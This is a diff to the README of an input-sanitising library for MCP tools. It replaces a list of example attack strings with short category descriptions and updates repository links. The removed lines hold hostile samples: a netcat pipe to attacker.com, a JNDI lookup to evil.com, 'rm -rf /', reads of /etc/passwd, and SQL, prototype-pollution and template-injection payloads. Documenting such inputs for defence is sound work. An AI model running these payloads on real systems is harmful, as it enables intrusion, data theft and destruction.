@@ -200,34 +200,12 @@ const sanitizer = new MCPSanitizer({
 
 ## Supported Attack Vectors
 
-### Directory Traversal
-- `../../../etc/passwd`
-- `..\\windows\\system32\\config`
-- `/proc/version`, `/sys/class/net`
-
-### Command Injection
-- `ls; rm -rf /`
-- `command && malicious_command`
-- `ls | nc attacker.com 4444`
-
-### SQL Injection
-- `'; DROP TABLE users;--`
-- `UNION SELECT * FROM passwords`
-- `EXEC xp_cmdshell('dir')`
-
-### Prototype Pollution
-- `{"__proto__": {"isAdmin": true}}`
-- `{"constructor": {"prototype": {"polluted": true}}}`
-
-### Template Injection
-- `{{constructor.constructor('return process')()}}`
-- `${jndi:ldap://evil.com/x}`
-- `<%= require("child_process").exec("whoami") %>`
-
-### Code Execution
-- `require('fs').readFileSync('/etc/passwd')`
-- `eval("malicious_code")`
-- `Function("return process")()`
+- **Directory Traversal** - Relative path escapes, absolute system paths, UNC paths
+- **Command Injection** - Shell metacharacters, chained commands, pipe redirection
+- **SQL Injection** - Union-based, boolean-based, time-based, stacked queries, comment injection
+- **Prototype Pollution** - Proto/constructor manipulation, deep property injection
+- **Template Injection** - Server-side template engines, JNDI lookups, expression languages
+- **Code Execution** - Dynamic evaluation, module loading, function constructors
 
 ## API Reference
 
@@ -451,8 +429,8 @@ node benchmark/skip-paths-performance.js
 
 - [Security Documentation](./docs/SECURITY.md) - Comprehensive security information
 - [Benchmark Documentation](./benchmark/README.md) - Performance and security testing
-- [CodeQL Results](https://github.com/yourusername/mcp-sanitizer/security/code-scanning) - Zero findings
-- [Release Notes](https://github.com/yourusername/mcp-sanitizer/releases) - Security improvements per version
+- [CodeQL Results](https://github.com/starman69/mcp-sanitizer/security/code-scanning) - Zero findings
+- [Release Notes](https://github.com/starman69/mcp-sanitizer/releases) - Security improvements per version
 
 ## Security Reporting
 
